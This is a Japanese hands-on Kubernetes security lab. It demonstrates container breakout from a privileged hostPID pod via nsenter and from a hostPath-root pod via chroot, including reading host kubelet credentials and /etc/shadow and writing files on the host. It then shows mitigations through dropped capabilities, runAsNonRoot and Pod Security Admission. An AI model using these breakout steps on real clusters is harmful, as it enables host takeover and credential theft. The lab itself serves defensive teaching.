# 演習2 コンテナシステムへの攻撃とセキュリティ対策

- [演習2 コンテナシステムへの攻撃とセキュリティ対策](#演習2-コンテナシステムへの攻撃とセキュリティ対策)
  - [1. コンテナブレイクアウトの理解](#1-コンテナブレイクアウトの理解)
    - [1.1 コンテナブレイクアウトとは](#11-コンテナブレイクアウトとは)
    - [1.2 nsenter を使ったホストの namespace への侵入](#12-nsenter-を使ったホストの-namespace-への侵入)
    - [1.3 hostpath を使ったホストのファイルシステムへの侵入](#13-hostpath-を使ったホストのファイルシステムへの侵入)
  - [2. Security Context によるコンテナブレイクアウト対策](#2-security-context-によるコンテナブレイクアウト対策)
    - [2.1 capabilities の制限](#21-capabilities-の制限)
    - [2.2 非rootユーザーでの実行](#22-非rootユーザーでの実行)
  - [3. Pod Security Standards によるポリシー強制](#3-pod-security-standards-によるポリシー強制)
    - [3.1 Pod Security Admission の設定](#31-pod-security-admission-の設定)
    - [3.2 セキュリティポリシーの強制](#32-セキュリティポリシーの強制)
    - [3.3 セキュアな Pod の作成と段階的導入](#33-セキュアな-pod-の作成と段階的導入)
  - [まとめ](#まとめ)
  - [環境のクリーンアップ](#環境のクリーンアップ)
  - [参考](#参考)

## 1. コンテナブレイクアウトの理解

Kubernetes などのコンテナシステムへの代表的な攻撃として、コンテナブレイクアウトの手法があります。<br/>
本演習では、コンテナブレイクアウトの仕組みを理解し、攻撃手法とその対策を体験します。

演習環境にアクセスし、必要に応じて作業ディレクトリを作成してください。

```bash
mkdir ch02
cd ch02
```

### 1.1 コンテナブレイクアウトとは

コンテナブレイクアウトは、コンテナ内から脱出してホストシステムにアクセスする攻撃手法です。<br/>
コンテナは基本的にはプロセス分離の技術であり、適切な設定がされていない場合、攻撃者がホストシステムに影響を与える可能性があります。

主なブレイクアウト手法:

1. **特権コンテナの悪用**: `privileged: true` が設定されたコンテナからのエスケープ
2. **危険な capabilities**: 不要な Linux capabilities の付与による権限昇格
3. **ホスト namespace の共有**: PID、ネットワーク、IPC namespace の共有
4. **危険なボリュームマウント**: ホストの重要なディレクトリのマウント
5. **脆弱なカーネルの悪用**: コンテナランタイムやカーネルの脆弱性

演習を通して攻撃手法を実際に体験し、対策の重要性を理解しましょう。

### 1.2 nsenter を使ったホストの namespace への侵入

nsenter は最も直接的なコンテナブレイクアウト手法の一つです。特権コンテナからホストの PID 1 の namespace に侵入します。

まずは `hostPID: true` かつ `privileged: true` の特権コンテナを作成します。

```bash
cat <<EOF > privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostPID: true
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
EOF

kubectl apply -f privileged-pod.yaml
```

この攻撃はコンテナへの侵入を前提とするため、`kubectl exec` で擬似的にコンテナに侵入した状態を作ります。

```bash
kubectl exec -it privileged-pod -- bash
```

`cat /etc/hostname` でホスト名を表示すれば、現在コンテナ内にいることがわかります。

今回のコンテナは PID namespace をホストと共有しており、かつ特権を有しています。<br/>
`ps aux` を実行すると、コンテナ内だけでなくホストのプロセスも表示されています。

また、ホストの PID 1 の情報は以下で確認できます。

```bash
ps aux | grep -E "^\s*root\s+1\s"
```

<details><summary>出力結果</summary>

```bash
root           1  0.0  0.6  22308 13288 ?        Ss   04:35   0:01 /sbin/init
```

</details>

それでは、`nsenter` コマンドを使い、コンテナからホストに脱出してみましょう。

```bash
nsenter -t 1 -m -u -i -n /bin/bash
```

オプションの意味は以下の通りで、ホストの各 namespace に入る設定をしています。

- -t 1: PID 1 をターゲット
- -m: mount namespace
- -u: UTS namespace 
- -i: IPC namespace
- -n: network namespace

`cat /etc/hostname` を再度実行すると、コンテナではなくノード（コンテナホスト）のホスト名が表示されるはずです。

これでコンテナの権限を超えてファイルアクセスできるようになりました。<br/>
ホストに存在するファイル閲覧やコマンド実行を試してみてください。

```bash
# kubelet の設定情報を確認
cat /etc/kubernetes/kubelet.conf
```

<details><summary>出力結果</summary>

```bash
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tC......5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://172.30.1.2:6443
  name: default-cluster
contexts:
- context:
    cluster: default-cluster
    namespace: default
    user: default-auth
  name: default-context
current-context: default-context
kind: Config
preferences: {}
users:
- name: default-auth
  user:
    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem
```

</details>

```bash
# ノードで実行されている全コンテナプロセスを確認
crictl ps
```

<details><summary>出力結果</summary>

```bash
CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID              POD                        NAMESPACE
feb177af5d1c8       b1dc6972547a6       34 minutes ago      Running             ubuntu              0                   4d642135d0e48       privileged-pod             default
9eb2736d9d90b       1cf5f116067c6       About an hour ago   Running             coredns             1                   628376fbe4ad3       coredns-6ff97d97f9-4wljj   kube-system
f6afe6be9e7da       1cf5f116067c6       About an hour ago   Running             coredns             1                   4a37ee6aaca18       coredns-6ff97d97f9-wmpcb   kube-system
246824d3d6e15       e6ea68648f0cd       About an hour ago   Running             kube-flannel        1                   e7f0d09d05ba8       canal-4xxhw                kube-system
9d5101c15c9e7       75392e3500e36       About an hour ago   Running             calico-node         1                   e7f0d09d05ba8       canal-4xxhw                kube-system
6992d69be3688       661d404f36f01       About an hour ago   Running             kube-proxy          1                   282a008b868ed       kube-proxy-d8lhg           kube-system
```

</details>

ホストの情報やファイルを窃取するだけでなく、永続化のためにファイルや設定を追加したり、横展開に繋げたりすることも可能です。

特権かつPIDをホストと共有するコンテナを実務で作成するケースは少ないかもしれませんが、攻撃者が Kubernetes の認証情報を持っていれば、攻撃の足掛かりとして脆弱なコンテナを作成することは十分に考えられます。

一通りの操作が完了したら、**必ず** `exit` コマンドでコンテナ内から抜けてください。<br/>
（`kubectl exec` と `nsenter` を実行している場合、2回 `exit` する必要があります）

```bash
# nsenter で入った場合
exit  # nsenter から抜ける
exit  # kubectl exec から抜ける
```

### 1.3 hostpath を使ったホストのファイルシステムへの侵入

コンテナに特権がなくとも、ホストへの侵入を可能にする方法はあります。<br/>
ここでは hostpath の設定を利用して、ホストのファイルシステムへの侵入を体験してみましょう。

```bash
cat <<EOF > hostpath-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f hostpath-pod.yaml
```

今回の Pod には、特権がない代わりに以下の設定を追加しています。

```yaml
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

これはホストの指定したパスをコンテナ内にマウントする設定で、ここではホストのルート（`/`）をコンテナにマウントしています。

Pod が正常に作成できたら、`kubectl exec` でコンテナ内に侵入した状態からスタートします。

```bash
kubectl exec -it hostpath-pod -- bash
```

`cat /etc/hostname` でコンテナ内にいることを確認した後、1.2 と同様のコマンドを試してみてください。

```bash
ps aux
```

<details><summary>出力結果</summary>

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2792  1408 ?        Ss   06:09   0:00 sleep 3600
root           7  0.0  0.1   4628  3584 pts/0    Ss   06:09   0:00 bash
root          18  0.0  0.1   7064  2944 pts/0    R+   06:10   0:00 ps aux
```

</details>

```bash
nsenter -t 1 -m -u -i -n /bin/bash
```

<details><summary>出力結果</summary>

```bash
nsenter: reassociate to namespace 'ns/ipc' failed: Operation not permitted
```

</details>

PID をホストと共有していないため、ホストのプロセスは確認できません。<br/>
また、特権コンテナでないため `nsenter` も実行できません。

しかし、`/host` にはホストのルートファイルシステムをマウントしているため、ホスト内のすべてのファイルをコンテナから確認できます。<br/>

```bash
ls /host
```

<details><summary>出力結果</summary>

```bash
bin                boot  etc   lib                lib64       media  opt   root  sbin                snap  swapfile  tmp  var
bin.usr-is-merged  dev   home  lib.usr-is-merged  lost+found  mnt    proc  run   sbin.usr-is-merged  srv   sys       usr
```

</details>

`chroot` でルートディレクトリを変更すれば、ホストに侵入しているのと同じ状態になります。

```bash
chroot /host bash
```

これでホストのファイル閲覧やコマンド実行が自由にできるようになりました。<br/>
`ps aux` や `crictl ps` などの実行結果を確認してみてください。

一通りの操作が完了したら、`exit` でコンテナ内から抜けてください。<br/>
（`kubectl exec` と `chroot` を実行している場合、2回 `exit` する必要があります）

```bash
# chroot で入った場合
exit  # chroot から抜ける  
exit  # kubectl exec から抜ける
```

## 2. Security Context によるコンテナブレイクアウト対策

Security Context を適切に設定すれば、コンテナブレイクアウトを防止できるのか検証してみましょう。<br/>
Security Context にはさまざまな設定がありますが、本演習では以下2つの設定を取り扱います。

- capabilities: コンテナプロセスの使用できる capabilities を制限
- runAsNonRoot: コンテナプロセスの実行ユーザーをroot以外に強制

「1.3 hostpath を使ったホストのファイルシステムへの侵入」で使用した Pod に対して、ホストパスのマウントを維持したまま Security Context を設定します。

### 2.1 capabilities の制限

まずは Linux capabilities を制限したコンテナを作成し、有効性を検証します。

```bash
cat <<EOF > capabilities-dropped-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: capabilities-dropped-pod
spec:
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f capabilities-dropped-pod.yaml
```

今回は 1.3 で使用した Pod マニフェストの `spec.containers` に、次の設定を追加しています。

```yaml
    securityContext:
      capabilities:
        drop: ["ALL"]
```

これはコンテナで使用できる capabilities が1つもないことを表しています。<br/>
コンテナ内で動作を確認してみましょう。

```bash
kubectl exec -it capabilities-dropped-pod -- bash
```

`exec` できたら、コンテナ内で `chroot` を試みます。

```bash
chroot /host bash
```

<details><summary>出力結果</summary>

```bash
chroot: cannot change root directory to '/host': Operation not permitted
```

</details>

操作が拒否されました。<br/>
続いて capabilities の状態を確認します。

```bash
cat /proc/$$/status | grep Cap
```

<details><summary>出力結果</summary>

```bash
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000000000000000
CapAmb: 0000000000000000
```

</details>

すべての数値が0のため、現在の bash プロセスで利用できる capabilities が存在しません。

1.3 で使用した `hostpath-pod` では、この数値は以下になっています。

```bash
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

このままだと分かりづらいので、`capsh` をインストールして可視化してみます。<br/>
なお、`capabilities-dropped-pod` には必要な capabilities がないため、`apt install` は実行できません。

この手順はスキップしても構いませんが、試す場合は capabilities の制限のない `hostpath-pod` の Pod 内や、手元の Linux 環境でコマンドを実行してください。

```bash
apt update && apt install -y libcap2-bin
```

インストール後、`capsh` コマンドを実行します。

```bash
capsh --decode=00000000a80425fb
```

<details><summary>出力結果</summary>

```bash
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

</details>

この出力結果を見ると、`hostpath-pod` には `cap_sys_chroot` を含め複数の capabilities が付与されています。<br/>
コンテナには不要な capabilities も多いので、このように必要最小限の capabilities のみを付与することで、コンテナ内で不正な操作が行われるリスクを軽減できます。

ただし、`chroot` はできませんが `/host` 以下のホストのファイルシステムを閲覧・操作することは引き続き可能です。<br/>
ホストパスをマウントした状態では、capabilities によるセキュリティ対策は十分ではありません。

```bash
cat /host/etc/shadow
```

<details><summary>出力結果</summary>

```bash
root:*:20110:0:99999:7:::
daemon:*:20110:0:99999:7:::
bin:*:20110:0:99999:7:::
sys:*:20110:0:99999:7:::
sync:*:20110:0:99999:7:::
games:*:20110:0:99999:7:::
man:*:20110:0:99999:7:::
lp:*:20110:0:99999:7:::
mail:*:20110:0:99999:7:::
news:*:20110:0:99999:7:::
uucp:*:20110:0:99999:7:::
proxy:*:20110:0:99999:7:::
www-data:*:20110:0:99999:7:::
backup:*:20110:0:99999:7:::
list:*:20110:0:99999:7:::
irc:*:20110:0:99999:7:::
_apt:*:20110:0:99999:7:::
nobody:*:20110:0:99999:7:::
systemd-network:!*:20110::::::
systemd-timesync:!*:20110::::::
dhcpcd:!:20110::::::
messagebus:!:20110::::::
syslog:!:20110::::::
systemd-resolve:!*:20110::::::
uuidd:!:20110::::::
tss:!:20110::::::
sshd:!:20110::::::
pollinate:!:20110::::::
tcpdump:!:20110::::::
landscape:!:20110::::::
fwupd-refresh:!*:20110::::::
polkitd:!*:20110::::::
ubuntu:9T$3J4GSvuGv7bM4Vn......n3Q6qA7:20129:0:99999:7:::
kc-internal:GSV......oFLMQlEaE:20129:0:99999:7:::
dnsmasq:!:20350::::::
```

</details>

```bash
touch /host/hacked; ls /host
```

<details><summary>出力結果</summary>

```bash
bin                boot  etc     home  lib.usr-is-merged  lost+found  mnt  proc  run   sbin.usr-is-merged  srv       sys  usr
bin.usr-is-merged  dev   hacked  lib   lib64              media       opt  root  sbin  snap                swapfile  tmp  var
```

</details>

capabilities の検証が完了したら、`exit` でコンテナから抜けてください。

```bash
exit  # kubectl exec から抜ける
```

### 2.2 非rootユーザーでの実行

次はコンテナプロセスの実行ユーザーをroot以外に強制し、その有効性を検証します。

```bash
cat <<EOF > nonroot-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: nonroot-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f nonroot-pod.yaml
```

今回は Pod マニフェストの `spec` に設定を追加しています。

```yaml
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
```

`runAsNonRoot` はコンテナの実行ユーザーがrootユーザー（`uid: 0`）の場合、Podの作成に失敗します。<br/>
デフォルトではrootユーザーとして起動するため、`runAsUser` と `runAsGroup` を設定する必要があります。

コンテナ内で動作を確認してみましょう。

```bash
kubectl exec -it nonroot-pod -- bash
```

`exec` できたら、コンテナ内で `chroot` を試みます。

```bash
chroot /host bash
```

<details><summary>出力結果</summary>

```bash
chroot: cannot change root directory to '/host': Operation not permitted
```

</details>

操作が拒否されました。<br/>
これは、コンテナの実行ユーザー（`uid: 1000`）に `chroot` の実行権限がないためです。

現在の実行ユーザーは `id` コマンドで確認できます。

<details><summary>出力結果</summary>

```bash
uid=1000 gid=1000 groups=1000
```

</details>

`exec` した際に `groups: cannot find name for group ID 1000` と表示され、またプロンプトの実行ユーザーの表記が `I have no name!` となっていたと思います。これは、コンテナイメージ内に uid=1000 に対応するユーザー名が定義されていないためです。

また、capabilities の場合と異なり、ホストのファイルシステムへの閲覧・操作も制限されます。

```bash
cat /host/etc/shadow
touch /host/hacked
```

<details><summary>出力結果</summary>

```bash
cat: /host/etc/shadow: Permission denied
touch: cannot touch '/host/hacked': Permission denied
```

</details>

ホストパスをマウントしている以上、ホストへのアクセスを完全に防ぐことはできませんが、攻撃者の行動を制限することには成功しました。

注意点として、コンテナの実行ユーザーを変更するには、アプリの変更が必要になる可能性があります。<br/>
導入前に、アプリがrootユーザー以外で実行可能であること、指定したユーザーでのファイル操作に問題がないことを確認してください。

runAsNonRoot の検証が完了したら、`exit` でコンテナから抜けてください。

```bash
exit  # kubectl exec から抜ける
```

## 3. Pod Security Standards によるポリシー強制

Security Context でのコンテナブレイクアウトの対策は、十分ではないことがわかりました。<br/>
また Security Context は Pod に直接設定するもので、攻撃者が作成する Pod には当然ながら設定されません。

そもそもとして、`privileged` や `hostpath` は使用せず、自由に設定できないようにするべきです。

自由にリソースを作成されるのを防ぐため、Pod Security Admission を使用して、セキュリティポリシーをクラスタ全体で強制しましょう。

### 3.1 Pod Security Admission の設定

最初に、新しい namespace を作成して Pod Security Standards (PSS) を適用します。

```bash
kubectl create namespace pss-test
kubectl label namespace pss-test pod-security.kubernetes.io/warn=baseline
```

PSS には3つのセキュリティレベルがあります。

- Privileged: 無制限のポリシー。セキュリティ要件を一切適用しない場合に使用されます。
- Baseline: 最小限の制限を行うポリシー。既知の特権昇格を防ぐことができます。
- Restricted: 最も厳しく制限されたポリシー。ベストプラクティスに沿った、セキュリティを最大限に高めた設定です。

そして PSS の実装である Pod Security Admission (PSA) には、3つの動作モードがあります。

- enforce: 違反するPodの作成/更新を拒否します。
- audit: 違反するPodの作成/更新を許可しますが、監査ログに記録します。
- warn: 違反するPodの作成/更新を許可しますが、クライアント（kubectlなど）に警告メッセージを表示します。

上記コマンドでは、PSS の Baseline を warn モードで設定しています。

```bash
kubectl get namespace pss-test --show-labels
```

<details><summary>出力結果</summary>

```bash
NAME       STATUS   AGE   LABELS
pss-test   Active   22m   kubernetes.io/metadata.name=pss-test,pod-security.kubernetes.io/warn=baseline
```

</details>

この状態で、`pss-test` namespace にホストパスをマウントした Pod を作成してみます。<br/>
構成は 1.3 で使用したものと同様ですが、namespace のみ変更しています。

```bash
cat <<EOF > hostpath-pod-pss.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod-pss
  namespace: pss-test
spec:
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f hostpath-pod-pss.yaml
```

<details><summary>出力結果</summary>

```bash
Warning: would violate PodSecurity "baseline:latest": hostPath volumes (volume "host-root")
pod/hostpath-pod-pss created
```

</details>

警告が表示されましたが、Pod の作成は成功しています。

```bash
kubectl get po -n pss-test
```

<details><summary>出力結果</summary>

```bash
NAME               READY   STATUS    RESTARTS   AGE
hostpath-pod-pss   1/1     Running   0          19s
```

</details>

続いて特権コンテナの Pod を作成してみます。<br/>
構成は 1.2 で使用したものと同様ですが、namespace のみ変更しています。

```bash
cat <<EOF > privileged-pod-pss.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod-pss
  namespace: pss-test
spec:
  hostPID: true
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
EOF

kubectl apply -f privileged-pod-pss.yaml
```

<details><summary>出力結果</summary>

```bash
Warning: would violate PodSecurity "baseline:latest": host namespaces (hostPID=true), privileged (container "ubuntu" must not set securityContext.privileged=true)
pod/privileged-pod-pss created
```

</details>

こちらも警告が表示され、Pod は作成されました。

### 3.2 セキュリティポリシーの強制

次に、warn モードを解除し enforce モードを設定してみます。

```bash
kubectl label namespace pss-test pod-security.kubernetes.io/enforce=baseline pod-security.kubernetes.io/warn-
```

<details><summary>出力結果</summary>

```bash
Warning: existing pods in namespace "pss-test" violate the new PodSecurity enforce level "baseline:latest"
Warning: hostpath-pod-pss: hostPath volumes
Warning: privileged-pod-pss: host namespaces, privileged
namespace/pss-test labeled
```

</details>

設定した namespace 内に、違反する Pod が存在するという警告が表示されました。<br/>
実行中の Pod には影響しませんが、enforce モードにより違反した Pod を新規作成することができなくなっています。

一度 Pod を削除した後、再度作成を試みます。

```bash
kubectl delete po -n pss-test privileged-pod-pss hostpath-pod-pss
kubectl apply -f hostpath-pod-pss.yaml
kubectl apply -f privileged-pod-pss.yaml
```

<details><summary>出力結果</summary>

```bash
pod "privileged-pod-pss" deleted
pod "hostpath-pod-pss" deleted
Error from server (Forbidden): error when creating "hostpath-pod-pss.yaml": pods "hostpath-pod-pss" is forbidden: violates PodSecurity "baseline:latest": hostPath volumes (volume "host-root")
Error from server (Forbidden): error when creating "privileged-pod-pss.yaml": pods "privileged-pod-pss" is forbidden: violates PodSecurity "baseline:latest": host namespaces (hostPID=true), privileged (container "ubuntu" must not set securityContext.privileged=true)
```

</details>

エラーが表示され、Pod の作成に失敗しました。<br/>
`get pod` を実行しても `No resources found in pss-test namespace.` が返ってきます。

このように、PSA で脆弱な設定の Pod がクラスタに作成されることを防ぎ、攻撃者の活動を大きく制限できます。

### 3.3 セキュアな Pod の作成と段階的導入

最後に、脆弱な設定を削除した Pod を作成し、ポリシーを満たすことを確認します。

```bash
cat <<EOF > secure-pod-pss.yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod-pss
  namespace: pss-test
spec:
  containers:
  - name: ubuntu
    image: ubuntu:22.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: false
EOF

kubectl apply -f secure-pod-pss.yaml
```

ポリシーに準拠した Pod は正常に作成されました。

```bash
kubectl get po -n pss-test
```

<details><summary>出力結果</summary>

```bash
NAME             READY   STATUS    RESTARTS   AGE
secure-pod-pss   1/1     Running   0          14s
```

</details>


PSA は非常に強力な仕組みですが、稼働中のクラスタに導入する場合は注意が必要です。

いきなり enforce モードを適用してしまうと、実行中のアプリケーションが正常に動作しなくなる可能性があります。<br/>
まずは warn や audit モードでクラスタの状態を確認し、問題をすべて解決してから enforce モードを設定することが推奨されます。

また PSA は namespace 単位での設定であり、設定済み namespace で特定の Pod を適用除外することはできません。<br/>
PSA を適用できない Pod がある場合は、PSA の enforce モードを設定していない namespace にデプロイするなどの工夫が必要です。

最後に、すべての namespace にポリシーを適用する例を示します。<br/>
dry-run で実行しているため、クラスタへの影響はありません。

```bash
kubectl label --dry-run=server --overwrite ns --all pod-security.kubernetes.io/enforce=baseline
```

<details><summary>出力結果</summary>

```bash
namespace/default labeled (server dry run)
namespace/kube-node-lease labeled (server dry run)
namespace/kube-public labeled (server dry run)
Warning: existing pods in namespace "kube-system" violate the new PodSecurity enforce level "baseline:latest"
Warning: canal-4xxhw (and 3 other pods): host namespaces, hostPath volumes, privileged
Warning: etcd-controlplane (and 3 other pods): host namespaces, hostPath volumes
namespace/kube-system labeled (server dry run)
namespace/local-path-storage labeled (server dry run)
namespace/pss-test not labeled (server dry run)
```

</details>

出力結果を見ると、`kube-system` で複数の Pod がポリシーに違反しています。<br/>
`kube-system` はクラスタ管理に必要なコンポーネントが稼働しており、ポリシーを強制するのは現実的には難しいです。

## まとめ

本演習では以下を学びました。

1. **コンテナブレイクアウトの脅威**: 適切な設定がないコンテナからホストシステムへの攻撃が可能
2. **Security Context の重要性**: 適切な設定により攻撃を防止/緩和
3. **Pod Security Standards**: 組織全体でセキュリティポリシーを強制する仕組み

実際の運用では、以下の点に注意が必要です。

- **段階的な導入**: baseline → restricted への段階的な移行
- **例外管理**: system namespace や特殊な要件がある Pod への対応
- **継続的な監視**: 監査ログやモニタリングによる違反の検出
- **開発者教育**: セキュアなコンテナ設定の知識共有

コンテナセキュリティは、技術的な対策だけでなく、組織的なプロセスとしても管理することが重要です。

## 環境のクリーンアップ

```bash
kubectl delete po privileged-pod hostpath-pod capabilities-dropped-pod nonroot-pod
kubectl delete ns pss-test
```

## 参考

- [ホストへのエスケープ - Container Security Book](https://container-security.dev/security/breakout-to-host)
- Kubernetes Documentation
  - [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
  - [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
  - [Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
  - [Apply Pod Security Standards at the Namespace Level](https://kubernetes.io/docs/tutorials/security/ns-level-pss/)
